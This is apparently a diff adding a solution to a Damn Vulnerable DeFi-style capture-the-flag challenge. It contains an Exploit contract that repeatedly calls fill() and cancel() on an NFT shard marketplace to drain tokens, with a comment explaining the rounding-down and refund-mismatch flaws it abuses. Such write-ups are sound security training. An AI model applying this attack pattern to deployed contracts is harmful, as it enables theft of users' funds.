@@ -114,7 +114,14 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
+         Exploit exploit = new Exploit(marketplace,token,recovery);
+        exploit.attack(1);
+        console.log("recovery balance",token.balanceOf(address(recovery)));
         
+        // this is why the exploit works: ShardsNFTMarketplace.fill() rounds the payment down (want * price / totalShards) 
+        //so buying a small number of shards costs 0 DVT, while cancel() refunds using a different formula (shards * rate / 1e6) 
+        //that pays back real DVT — and cancel()'s time check is written backwards so it can be called immediately, 
+        //letting the attacker fill-for-free then cancel-for-profit in one transaction and send the stolen DVT to recovery
     }
 
     /**
@@ -134,5 +141,32 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+
+
+
+contract Exploit {
+    ShardsNFTMarketplace public marketplace;
+    DamnValuableToken public token;
+    address recovery;
+
+    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
+        marketplace = _marketplace;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack(uint64 offerId) external {
+        uint256 wantShards = 100; // Fill 100 shards per call
+
+        // Loop 10001 times to execute fill(1, 100)
+        for (uint256 i = 0; i < 10001; i++) {
+            marketplace.fill(offerId, wantShards);
+            marketplace.cancel(1,i);
+        }
+
+        token.transfer(recovery,token.balanceOf(address(this)));
     }
 }
